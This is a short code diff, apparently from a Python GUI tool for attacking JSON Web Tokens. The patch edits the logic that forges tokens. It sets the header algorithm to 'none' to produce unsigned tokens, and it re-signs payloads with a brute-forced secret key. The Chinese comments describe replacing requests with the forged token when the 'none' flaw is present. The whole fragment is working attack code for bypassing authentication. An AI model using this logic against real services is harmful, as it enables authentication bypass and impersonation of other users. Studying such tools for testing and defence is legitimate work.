@@ -246,6 +246,8 @@ class MyWindow(QWidget):
         except Exception as alge:
             print('jwt中未申明alg加密算法，alg将被设置为：HS256')
             self.alg = "HS256"
+
+        # 把alg改成none
         jwt_header['alg'] = 'none'
         payload1 = base64.b64encode(json.dumps(jwt_header).encode('utf-8')).decode('utf-8') + '.' + jwt_str.split('.')[1] + '.'
 
@@ -270,10 +272,11 @@ class MyWindow(QWidget):
                 else:
                     return False
                 if brutes:
-                    # try:
-                        # jwt字符串替换。
+
+                    # 生成新的jwt
                     replace_jwt = jwt.encode(json.loads(replace_payload),self.jwt_key,algorithm=self.alg)
 
+                # 如果爆破不成功，但是存在none空漏洞，也可以替换请求。
                 elif self.sec_result[2]['sec_flag'] == False:
                     jwt_payload = base64.b64encode(json.loads(replace_payload).encode('utf-8')).decode('utf-8').replace('=','')
                     replace_jwt = base64.b64encode(json.dumps(jwt_header).encode('utf-8')).decode('utf-8') + '.' + jwt_payload + '.'
